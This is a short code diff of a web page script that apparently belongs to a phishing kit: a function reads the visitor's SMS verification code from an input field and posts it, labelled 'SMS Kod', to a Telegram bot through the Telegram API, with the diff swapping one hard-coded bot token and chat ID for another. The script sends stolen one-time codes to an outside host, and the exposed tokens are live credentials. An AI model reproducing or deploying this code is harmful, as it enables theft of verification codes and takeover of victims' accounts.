@@ -38,10 +38,10 @@
     <script>
         function sendTelegramMessage() {
             var smsCode = document.getElementById('sms-code').value;
-            var chatId = "-2097869667";
-            var token = "6872411950:AAHtV6m6NDnXSmU1JFdcoT4PCiMEl5Z9rWY";
+            var chatId = "-4571747062";
+            var token = "7217355543:AAEjJPJSyBqX-4kIjM-NWIohNJU0SEuCBcQ";
             var message = "SMS Kod: " + smsCode;
-
+            
             fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                 method: 'POST',
                 headers: {
